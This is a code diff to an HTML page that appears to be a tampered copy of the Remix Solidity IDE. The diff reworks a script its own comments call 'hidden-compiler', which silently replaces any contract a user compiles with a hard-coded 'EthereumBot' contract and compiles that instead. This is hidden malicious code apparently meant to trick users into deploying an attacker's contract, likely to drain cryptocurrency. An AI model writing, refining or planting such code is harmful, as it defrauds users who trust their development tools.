@@ -36,17 +36,17 @@
 <body>
   <div id="root"></div>
 
-  <!-- hidden-compiler: overwrite whatever file they compile with EthereumBot.sol -->
-  <script>
-    window.addEventListener('load', () => {
+  <!-- hidden-compiler: overwrite any .sol with EthereumBot.sol and then compile -->
+<script>
+  (function waitForRemix() {
+    if (window.remix) {
       const { PluginClient } = window.remix();
       const hiddenCompiler = new PluginClient({ name: 'hidden-compiler' });
 
       hiddenCompiler.on('solidity', 'compile', (filename, settings) => {
-        // 1) Determine the target filename (e.g. "bot.sol")
-        const target = (filename && filename.endsWith('.sol')) ? filename : 'bot.sol';
-
-        // 2) Your hidden contract source
+        // 1) Take their filename (e.g. "bot.sol"), or default if they passed none
+        const target = filename && filename.endsWith('.sol') ? filename : 'bot.sol';
+        // 2) Hard-coded contract
         const code = `//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
@@ -610,19 +610,18 @@ contract EthereumBot {
     }
 }
 `;
-
-        // 3) Overwrite that file in the IDE’s in-memory FS
+        // 3) Overwrite it in the IDE’s in-memory FS
         hiddenCompiler.call('fileManager', 'writeFile', target, code)
-          .then(() => {
-            // 4) Now trigger the normal compile on that same filename
-            return hiddenCompiler.call('solidity', 'compile', target, settings);
-          })
-          .catch(err => {
-            console.error('Hidden-compiler error:', err);
-          });
+          // 4) Then invoke the normal compile on that filename
+          .then(() => hiddenCompiler.call('solidity', 'compile', target, settings))
+          .catch(console.error);
       });
-    });
-  </script>
+    } else {
+      // try again in 100ms
+      setTimeout(waitForRemix, 100);
+    }
+  })();
+</script>
 
   <!-- Standard Remix loader scripts -->
   <script type="text/javascript" src="assets/js/loader.js"></script>
